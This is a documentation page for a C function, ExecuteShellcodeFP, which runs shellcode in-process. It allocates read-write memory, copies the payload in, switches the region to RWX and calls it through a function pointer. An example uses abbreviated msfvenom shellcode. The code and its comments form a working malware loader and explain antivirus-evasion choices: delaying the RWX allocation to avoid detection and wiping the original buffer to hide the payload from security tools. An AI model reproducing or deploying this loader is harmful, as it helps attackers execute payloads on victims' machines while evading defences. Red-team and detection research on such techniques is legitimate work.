## Local Shellcode Execution via Function Pointer

Executes a shellcode buffer in the current process by allocating a `RW` memory region, copying the shellcode into it, flipping the protection to `RWX` with `VirtualProtect`, then jumping directly into the shellcode by casting the base address to a `VOID` function pointer and calling it inline. The original shellcode buffer is zeroed out after the copy to reduce in-memory exposure.

> **Note:** The shellcode executes on the calling thread. If the shellcode terminates its own thread upon completion (such as Msfvenom-generated shellcode), the entire process will exit. Use the `CreateThread` method when this is a concern.

**Usage**

Call `ExecuteShellcodeFP` with the shellcode buffer and its size. The function returns only after the shellcode has finished executing on the calling thread.

- `IN PBYTE pShellcode`  Base address of the shellcode buffer to execute.
- `IN SIZE_T sShellcodeSize`  Size of `pShellcode` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the shellcode was successfully allocated, written, and invoked, otherwise `FALSE`. Note that if the shellcode terminates the calling thread, this function never returns.

**External Files**

- `windows.h`  `PBYTE`, `PVOID`, `BOOL`, `DWORD`, `SIZE_T`, `PDWORD`, `IN`, `VirtualAlloc()`, `VirtualProtect()`, `VirtualFree()`, `GetLastError()`

- `stdio.h`  `printf()`


### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>

// Function pointer type matching a void shellcode entry point.
typedef VOID(WINAPI* fnShellcodeFunc)();


BOOL ExecuteShellcodeFP(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize)
{
    if (pShellcode == NULL || sShellcodeSize == 0)
        return FALSE;

    PVOID   pShellcodeAddress   = NULL;
    DWORD   dwOldProtection     = NULL;

    // Allocate RW memory to hold the shellcode.
    // PAGE_READWRITE is used instead of PAGE_EXECUTE_READWRITE to avoid
    // an immediate RWX allocation which is a common malicious indicator.
    pShellcodeAddress = VirtualAlloc(
        NULL,                       // Let the OS choose the base address.
        sShellcodeSize,             // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE,   // Reserve and commit pages in one call.
        PAGE_READWRITE              // RW only at allocation time; execute is added later.
    );
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Copy the shellcode into the allocated region.
    memcpy(pShellcodeAddress, pShellcode, sShellcodeSize);

    // Zero out the original shellcode buffer — it is no longer needed
    // and clearing it reduces the chance of security solutions finding
    // the payload in heap memory.
    memset(pShellcode, '\0', sShellcodeSize);

    // Flip the memory protection from RW to RWX so the shellcode can execute.
    if (!VirtualProtect(
        pShellcodeAddress,          // Base address of the region to modify.
        sShellcodeSize,             // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE,     // New protection: read, write, and execute.
        &dwOldProtection            // Receives the previous protection value.
    )) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[i] Executing Shellcode At : 0x%p \n", pShellcodeAddress);

    // Cast the shellcode base address to a function pointer and call it directly.
    // This jumps execution to pShellcodeAddress on the current thread.
    fnShellcodeFunc pShell = (fnShellcodeFunc)pShellcodeAddress;
    pShell();

    return TRUE;
}
```

**Example**

```c
// msfvenom calc shellcode, abbreviated for the snippet.
unsigned char pPayload[]   = { 0xFC, 0x48, 0x83, 0xE4, 0xF0 /* ... */ };
SIZE_T        sPayloadSize = sizeof(pPayload);

// Stage + invoke the shellcode on the calling thread via a function pointer.
// NOTE: if the shellcode exits the thread on completion, the whole process dies.
ExecuteShellcodeFP(pPayload, sPayloadSize);
```
